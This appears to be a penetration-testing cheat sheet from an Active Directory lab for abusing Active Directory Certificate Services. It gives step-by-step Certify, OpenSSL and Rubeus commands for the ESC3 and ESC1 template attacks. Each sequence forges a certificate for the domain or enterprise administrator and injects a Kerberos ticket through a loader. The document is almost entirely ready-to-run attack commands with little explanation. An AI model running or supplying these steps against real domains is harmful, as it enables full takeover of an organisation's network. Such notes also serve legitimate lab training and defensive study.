We can use the Certify tool (https://github.com/GhostPack/Certify) to enumerate (and for other attacks) AD CS in the target forest

```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Certify.exe -args cas
```

Enumerate templates
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Certify.exe -args find
```

Enumerate vulnerable templates
> **Note:** This will only show us templates where normal users have enrolment rights to it
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Certify.exe -args find /vulnerable
```

### ESC3 example
##### Enterprise Administrator 

> **Note:** Difference between DA and EA is we specify the domain of the forest root for EA

Request a certificate for a certificate template (example: `SmartCardEnrollment-Agent`)
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Certify.exe -args request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"SmartCardEnrollment-Agent"
```

Convert from `cert.pem` to `esc3.pfx` 
```powershell
C:\Users\Public\openssl\openssl.exe pkcs12 -in C:\Users\Public\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\Users\Public\esc3.pfx
```

Use `esc3.pfx` to request a certificate on behalf of EA using the `SmartCardEnrollment-Users` template
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Certify.exe -args request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator /enrollcert:esc3.pfx /enrollcertpw:Pwned123!
```

Request EA TGT and inject it
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /certificate:esc3.pfx /dc:mcorp-dc.moneycorp.local /password:Pwned123! /ptt
```
##### Domain Administrator
Request a certificate for a certificate template (example: `SmartCardEnrollment-Agent`)
```powershell
.\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"SmartCardEnrollment-Agent"
```

Convert from `cert.pem` to `esc3.pfx` 
```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3.pfx
```

Use `esc3.pfx` to request a certificate on behalf of DA using the `SmartCardEnrollment-Users` template.
```powershell
.\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:esc3.pfx /enrollcertpw:Pwned123!
```

Convert from `cert.pem` to pfx (`esc3user-DA.pfx` below), request DA TGT and inject it
```powershell
.\Loader.exe -path .\Rubeus.exe -args asktgt /user:administrator /certificate:esc3.pfx /password:Pwned123! /ptt
```

### ESC1 example
Check for templates that has the value of `ENROLLEE_SUPPLIES_SUBJECT ` for `msPKI-Certificates-Name-Flag`
```powershell
.\Certify.exe find /enrolleeSuppliesSubject
```

The template `HTTPSCertificates` allows enrolment to the RDPUsers group. Request
a certificate for DA (or EA) as a regular user
```powershell
.\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
```

Convert from `cert.pem` to `esc1.pfx` and specify export password
```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1.pfx
```

Request a TGT for DA (or EA)
```powershell
.\Loader.exe -path .\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1.pfx /password:Pwned123! /ptt
```
